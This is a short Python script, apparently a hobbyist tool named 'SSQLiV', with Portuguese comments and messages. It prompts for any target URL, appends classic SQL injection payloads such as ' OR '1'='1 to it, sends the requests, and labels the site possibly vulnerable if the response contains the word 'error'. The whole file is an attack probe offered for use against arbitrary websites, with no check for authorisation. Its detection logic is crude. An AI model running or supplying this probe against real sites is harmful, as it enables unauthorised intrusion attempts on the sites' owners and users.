import requests
import time
from urllib.parse import urlparse

# Função para verificar se um site é vulnerável a SQL Injection
def check_sql_injection(url):
    payloads = ["' OR '1'='1", "' OR '1'='1'--", '" OR "1"="1', '" OR "1"="1"--']

    for payload in payloads:
        modified_url = url + payload
        response = requests.get(modified_url)

        if "error" in response.text.lower():
            print("POSSIVELMENTE Vulnerável A INJEÇÃO SQL")
            return

    print("POSSIVELMENTE NÃO Vulnerável A INJEÇÃO SQL")

    time.sleep(1)  # Intervalo de 1 segundo após a resposta

# Arte ASCII
ascii_art = """
   __________ ____    __    _ _    __
  / ___/ ___// __ \  / /   (_) |  / /
   \__ \\__ \/ / / / / /   / /| | / / 
 ___/ /__/ / /_/ / / /___/ / | |/ /  
/____/____/\___\_\/_____/_/  |___/   v1.
                                     
  "SIMPLE SQL Injection VERIFY v1. by: twitter.com/mtz_treze"
"""

print(ascii_art)
print("SSQLiV Iniciando..")
print("Digite a URL do site para verificar.")
print("Exemplo: http://www.example.com")

while True:
    # Solicitar a URL do site ao usuário
    site_url = input("URL do Alvo (ou 'sair' para encerrar): ")

    if site_url.lower() == "sair":
        break

    if not site_url:
        print("Erro: A URL não pode estar vazia. Por favor, tente novamente.")
        continue

    parsed_url = urlparse(site_url)
    if not all([parsed_url.scheme, parsed_url.netloc]):
        print("Erro: A URL fornecida não é válida.")
        continue

    # Verificar se o site é vulnerável a SQL Injection
    check_sql_injection(site_url)
    print("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~>")  # Linha em branco para separar as respostas
